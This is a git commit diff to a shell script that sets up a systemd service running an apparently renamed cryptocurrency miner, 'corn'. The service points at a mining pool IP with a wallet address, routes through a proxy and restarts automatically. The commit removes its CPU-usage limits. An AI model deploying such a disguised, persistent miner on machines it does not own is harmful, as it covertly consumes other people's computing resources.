d4c61c88b47926e596c416a6a786693834099db6
maghiorldon <maggioeldon@my.jccmi.edu>
2025-04-20 04:46:03 +0800

    Update corn-loe.sh

--- corn-loe.sh
+++ corn-loe.sh
@@ -40,7 +40,7 @@ After=network.target
 
 WorkingDirectory=/home/corn
 
-ExecStart=/home/corn/corn -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x  --cpu-priority=2 --cpu-max-threads-hint=50 -k --proxy 127.0.0.1:1080 
+ExecStart=/home/corn/corn -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x -k --proxy 127.0.0.1:1080 
 
 Restart=always
 
